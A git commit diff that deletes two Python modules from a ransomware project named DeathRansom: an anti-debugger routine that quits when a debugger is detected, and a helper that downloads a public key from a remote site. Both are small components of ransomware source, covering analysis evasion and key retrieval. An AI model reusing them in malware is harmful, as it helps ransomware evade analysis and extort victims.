83e2dfee69d4f103f5134fb877d254110eb7cb66
ryanmrestivo <53523282+ryanmrestivo@users.noreply.github.com>
2021-05-25 15:40:30 -0400

    .

--- Ransomware/DeathRansom/modules/bypass/anti_debugger.py
+++
@@ -1,9 +0,0 @@
-from ctypes import *
-import sys
-
-def check():
-    isDebuggerPresent = windll.kernel32.IsDebuggerPresent()
-    if(isDebuggerPresent):
-        sys.exit(0)
-    else:
-        return True
--- Ransomware/DeathRansom/modules/learn_key.py
+++
@@ -1,5 +0,0 @@
-import requests
-
-def public_key(site):
-    requisicao = requests.get(site)
-    return requisicao.text
